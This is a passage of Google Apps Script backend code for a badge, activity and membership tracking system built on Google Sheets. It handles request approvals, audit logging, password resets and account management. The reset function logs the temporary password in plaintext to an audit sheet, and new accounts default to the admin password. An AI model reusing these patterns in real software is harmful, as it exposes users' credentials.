  for(let i=1;i<data.length;i++){ if(data[i][0].toString()===reqId){ row=data[i]; sheet.getRange(i+1,8).setValue(decision); sheet.getRange(i+1,10).setValue(reviewer); sheet.getRange(i+1,11).setValue(now()); sheet.getRange(i+1,12).setValue(note||''); sheet.getRange(i+1,13).setValue(confirmed_date||formatDate(new Date())); break; } }
  if(!row) return jsonResponse({success:false,error:'找不到申請'});
  if(decision==='approved'){
    const pSheet=getSheet().getSheetByName('進度追蹤');
    pSheet.appendRow([row[1],row[3],confirmed_date||row[5],new Date(),reviewer, '由申請轉入：'+(note||'')]);
    return jsonResponse({success:true,message:'已批准並寫入進度'});
  }
  return jsonResponse({success:true,message:'已拒絕'});
}
function handleGetOtherBadges(ymis){
  const sheet=getSheet().getSheetByName('其他獎章'); const list=[];
  if(sheet){ const data=sheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ if(data[i][0].toString()===ymis){ list.push({id:data[i][1].toString(),name:data[i][2].toString(),date:data[i][3]?formatDate(data[i][3]):'',cert:data[i][4]?data[i][4].toString():''}); } } }
  return jsonResponse({success:true,other:list});
}
function handleSaveOtherBadge(records){
  const sheet=getSheet().getSheetByName('其他獎章'); if(!sheet) return jsonResponse({success:false,error:'Sheet missing'});
  let c=0;
  records.forEach(function(r){
    const data=sheet.getDataRange().getValues(); let found=false;
    for(let i=1;i<data.length;i++){ if(data[i][0].toString()===r.ymis && data[i][1].toString()===r.badgeId){ sheet.getRange(i+1,3).setValue(r.date); sheet.getRange(i+1,4).setValue(r.cert||''); sheet.getRange(i+1,5).setValue(r.note||''); sheet.getRange(i+1,6).setValue(new Date()); found=true; c++; break; } }
    if(!found){ sheet.appendRow([r.ymis,r.badgeId,r.name||r.badgeId,r.date,r.cert||'',r.note||'',new Date()]); c++; }
  });
  return jsonResponse({success:true,processed:c});
}

// ================== v5.0 全前端控制 (向後兼容) ==================
// 寫入操作紀錄 (若無 audit 表則自動建)
function writeAudit(actor,action,target,detail){
  try{
    const ss=getSheet();
    let sh=ss.getSheetByName('操作紀錄');
    if(!sh){ sh=ss.insertSheet('操作紀錄'); sh.appendRow(['時間','操作者','操作','對象','詳情']); sh.getRange(1,1,1,5).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF'); sh.setFrozenRows(1); }
    sh.appendRow([now(),actor||'',action||'',target||'',detail||'']);
  }catch(e){ console.warn('writeAudit failed',e); }
}
// 重設密碼 - 生成一次性臨時密碼
function handleResetPassword(targetYmis,managerYmis){
  try{
    const sh=getSheet().getSheetByName('Users');
    if(!sh) return jsonResponse({success:false,error:'Users sheet 缺失'});
    if(!targetYmis) return jsonResponse({success:false,error:'請提供目標 YMIS'});
    if(targetYmis==='sheep' || (targetYmis||'').toString().toLowerCase()==='sh'+'eep') return jsonResponse({success:false,error:'不能重設系統管理員密碼'});
    if(targetYmis===managerYmis) return jsonResponse({success:false,error:'不能重設自己的密碼，請聯絡其他管理員'});
    const data=sh.getDataRange().getValues();
    for(let i=1;i<data.length;i++){
      if(String(data[i][0])===String(targetYmis)){
        const temp='Rover'+Math.floor(100000+Math.random()*900000);
        sh.getRange(i+1,5).setValue(hashPassword(temp));
        // 若有第 13 欄 (allowed_badges) 保留，第 6 欄為 branch（小隊）
        if(data[i][5]!=='' && data[i][5]!==null && data[i][5]!==undefined){
          // 保留現有資料，只改密碼
        }
        writeAudit(managerYmis,'reset_password',targetYmis,'重設為一次性密碼: '+temp);
        return jsonResponse({success:true,temp_password:temp,message:'已重設，請通知用戶首次登入後更改密碼'});
      }
    }
    return jsonResponse({success:false,error:'找不到此 YMIS'});
  }catch(e){ return jsonResponse({success:false,error:e.toString()}); }
}
// 開立可登入帳號
function handleAddUser(body){
  try{
    const ymis=(body.ymis||'').toString().trim();
    const name=(body.name||'').toString().trim();
    const email=(body.email||'').toString().trim();
    const role=(body.role||'member').toString().trim();
    const password=(body.password||'').toString();
    const squad=(body.squad||'').toString().trim();
    const squadRole=(body.squad_role||'member').toString().trim();
    const canTick=body.can_tick===true||body.can_tick==='true'||body.can_tick==='TRUE';
    if(!/^\d{10}$/.test(ymis)) return jsonResponse({success:false,error:'YMIS 須為 10 位數字'});
    if(!name) return jsonResponse({success:false,error:'請填寫姓名'});
    if(getUser(ymis)) return jsonResponse({success:false,error:'YMIS 已註冊'});
    if(email && getUserByEmail(email)) return jsonResponse({success:false,error:'Email 已註冊'});
    // 允許的角色
    const validRoles=['member','exec_committee','branch_leader','group_leader','admin'];
    if(validRoles.indexOf(role)<0) return jsonResponse({success:false,error:'無效的角色: '+role});
    const uSheet=getSheet().getSheetByName('Users');
    if(!uSheet) return jsonResponse({success:false,error:'Users 工作表不存在'});
    const nowStr=now();
    const pwdHash = password ? hashPassword(password) : hashPassword(ADMIN_PASS);
    const allowedBadges = role==='member' ? '' : (role==='exec_committee' ? 'L1,活動段章,OTHER' : '*');
    // 13 欄 schema (向後兼容)
    uSheet.appendRow([
      ymis,                              // 1 ymis
      name,                              // 2 name
      email,                             // 3 email
      role,                              // 4 role
      pwdHash,                           // 5 password_hash
      squad,                             // 6 branch (兼小隊)
      canTick,                           // 7 can_tick
      'bulk_onboard',                    // 8 auth_by
      nowStr,                            // 9 auth_date
      nowStr,                            // 10 created_at
      '',                                // 11 last_login
      'active',                          // 12 status
      allowedBadges                      // 13 allowed_badges
    ]);
    // 同時加入成員名單
    let mSheet=getSheet().getSheetByName('成員名單');
    if(!mSheet){
      mSheet=getSheet().insertSheet('成員名單');
      mSheet.appendRow(['YMIS','姓名','加入日期','支部','聯絡','小隊']);
    }
    mSheet.appendRow([ymis, name, new Date(), '', '', squad]);
    writeAudit(ymis,'add_user',ymis,'前端開立帳號 role='+role);
    return jsonResponse({success:true,message:'帳號已建立'+(password?'（已設密碼）':'（請通知用戶首次登入後改密碼）')});
  }catch(e){ return jsonResponse({success:false,error:e.toString()}); }
}
// 停用帳號 - 設 status=inactive，清除 tokens，保留資料
function handleDeactivateUser(body,manager,managerYmis){
  try{
    const targetYmis=(body.target_ymis||'').toString().trim();
    if(!targetYmis) return jsonResponse({success:false,error:'請提供 YMIS'});
    if(targetYmis==='sheep' || (targetYmis||'').toString().toLowerCase()==='sh'+'eep') return jsonResponse({success:false,error:'不能停用系統管理員帳號'});
    if(targetYmis===managerYmis) return jsonResponse({success:false,error:'不能停用自己'});
    const target=getUser(targetYmis);
    if(!target) return jsonResponse({success:false,error:'找不到此用戶'});
    // 權限檢查：不能停用比自己高等級的用戶
    if(getRoleLevel(manager.role)<getRoleLevel(target.role) && manager.role!=='super_admin') return jsonResponse({success:false,error:'權限不足，不能停用比您高等級的用戶'});
    const sh=getSheet().getSheetByName('Users');
    if(!sh) return jsonResponse({success:false,error:'Users sheet 缺失'});
    const data=sh.getDataRange().getValues();
    for(let i=1;i<data.length;i++){
      if(String(data[i][0])===String(targetYmis) && data[i][11]==='active'){
        sh.getRange(i+1,12).setValue('inactive');
        // 清除此用戶的 tokens
        try{
          const tSheet=getSheet().getSheetByName('Tokens');
          if(tSheet){
            const td=tSheet.getDataRange().getValues();
            for(let j=td.length-1;j>=1;j--){
              if(td[j][1] && String(td[j][1])===String(targetYmis)) tSheet.deleteRow(j+1);
            }
          }
        }catch(e){ console.warn('clear tokens failed',e); }
        // 從成員名單移除 (但保留歷史)
        try{
          const mSheet=getSheet().getSheetByName('成員名單');
          if(mSheet){
            const md=mSheet.getDataRange().getValues();
            for(let k=md.length-1;k>=1;k--){
              if(md[k][0] && String(md[k][0])===String(targetYmis)) mSheet.deleteRow(k+1);
            }
          }
        }catch(e){ console.warn('clear member list failed',e); }
        writeAudit(managerYmis,'deactivate_user',targetYmis,'停用帳號');
        return jsonResponse({success:true,message:'已停用 '+targetYmis+'，token 已清除'});
      }
    }
    return jsonResponse({success:false,error:'找不到活躍用戶'});
  }catch(e){ return jsonResponse({success:false,error:e.toString()}); }
}

// ===== v8.1：活動履歷（服務／活動／訓練班紀錄） =====
function getLogRecordsList(){
  const sheet=getSheet().getSheetByName(LOG_SHEET_NAME); const logs=[];
  if(sheet){
    const data=sheet.getDataRange().getValues();
    for(let i=1;i<data.length;i++){
      if(!data[i][0]) continue;
      logs.push({
        record_id:String(data[i][0]), type:String(data[i][1]||'activity'),
        ymis:String(data[i][2]||''), name:String(data[i][3]||''),
        date:data[i][4]?formatDate(data[i][4]):'', title:String(data[i][5]||''),
        role:String(data[i][6]||''), hours:String(data[i][7]||''),
        cert_no:String(data[i][8]||''), detail:String(data[i][9]||''),
        recorder:String(data[i][10]||''),
        recorded_at:data[i][11]?String(data[i][11]):''
      });
    }
  }
  return logs;
}
function handleGetLogRecords(){
  // 未升級/未初始化時明確報錯，讓前端顯示升級提示
  if(!getSheet().getSheetByName(LOG_SHEET_NAME)) return jsonResponse({success:false,error:'「'+LOG_SHEET_NAME+'」工作表不存在：請在 Apps Script 執行 initializeSheets() 補建'});
  return jsonResponse({success:true,logs:getLogRecordsList()});
}
function sanitizeLogRecord(r){
  r=r||{};
  let type = LOG_TYPES.indexOf(r.type)>=0 ? r.type : 'activity';
  let role = safeSheetText(r.role,60);
  if(type==='training' && !role){
    role='學員';
  }
  return {
    type: type,
    ymis: String(r.ymis||'').trim().substring(0,20),
    name: safeSheetText(r.name,60),
    date: String(r.date||'').substring(0,20),
    title: safeSheetText(r.title,120),
    role: role,
    hours: String(r.hours==null?'':r.hours).substring(0,20),
    cert_no: safeSheetText(r.cert_no,60),
    detail: safeSheetText(r.detail,500)
  };
}
function handleSaveLogRecord(records, recorderYmis, recorderName){
  const sheet=getSheet().getSheetByName(LOG_SHEET_NAME);
  if(!sheet) return jsonResponse({success:false,error:'「'+LOG_SHEET_NAME+'」工作表不存在：請在 Apps Script 執行 initializeSheets() 補建'});
  if(!Array.isArray(records)||records.length===0) return jsonResponse({success:false,error:'沒有可儲存的紀錄'});
  if(records.length>200) return jsonResponse({success:false,error:'一次最多 200 筆，請分批'});
  const results=[]; let processed=0;
  records.forEach(function(r){
    const rec=sanitizeLogRecord(r);
    if(!rec.ymis||!rec.title||!rec.date){ results.push({success:false,ymis:rec.ymis,title:rec.title,error:'YMIS、名稱及日期必填'}); return; }
    const rid=String((r&&r.record_id)||'');
    if(rid){
      // 更新既有紀錄（record_id 不變）
      const data=sheet.getDataRange().getValues();
      for(let i=1;i<data.length;i++){
        if(String(data[i][0])===rid){
          sheet.getRange(i+1,2,1,12).setValues([[rec.type,rec.ymis,rec.name,rec.date,rec.title,rec.role,rec.hours,rec.cert_no,rec.detail,sheet.getRange(i+1,11).getValue()||recorderName||recorderYmis,String(data[i][11]||''),now()]]);
          results.push({success:true,record_id:rid}); processed++;
          writeAudit(recorderYmis,'update_log',rec.ymis,rec.type+': '+rec.title+' '+rec.date);
          return;
        }
      }
      results.push({success:false,record_id:rid,error:'找不到紀錄'}); return;
    }
    const newId='LOG_'+Date.now()+'_'+Math.random().toString(36).substr(2,5);
    sheet.appendRow([newId,rec.type,rec.ymis,rec.name,rec.date,rec.title,rec.role,rec.hours,rec.cert_no,rec.detail,recorderName||recorderYmis,now(),'']);
    results.push({success:true,record_id:newId}); processed++;
    writeAudit(recorderYmis,'add_log',rec.ymis,rec.type+': '+rec.title+' '+rec.date);
  });
  const failed=results.filter(function(x){return !x.success;}).length;
  return jsonResponse({success:(results.length>0&&failed===0),processed:processed,results:results,message:processed+' 筆已儲存'+(failed?'，'+failed+' 筆失敗':'')});
}
function handleDeleteLogRecord(recordId, recorderYmis){
  const sheet=getSheet().getSheetByName(LOG_SHEET_NAME);
  if(!sheet) return jsonResponse({success:false,error:'「'+LOG_SHEET_NAME+'」工作表不存在：請在 Apps Script 執行 initializeSheets() 補建'});
  recordId=String(recordId||'');
  if(!recordId) return jsonResponse({success:false,error:'缺少 record_id'});
  const data=sheet.getDataRange().getValues();
  for(let i=1;i<data.length;i++){
    if(String(data[i][0])===recordId){
      const label=String(data[i][1]||'')+': '+String(data[i][5]||'')+' '+String(data[i][4]||'');
      const target=String(data[i][2]||'');
      sheet.deleteRow(i+1);
      writeAudit(recorderYmis,'delete_log',target,label);
      return jsonResponse({success:true,message:'已刪除紀錄'});
    }
  }
  return jsonResponse({success:false,error:'找不到紀錄'});
}
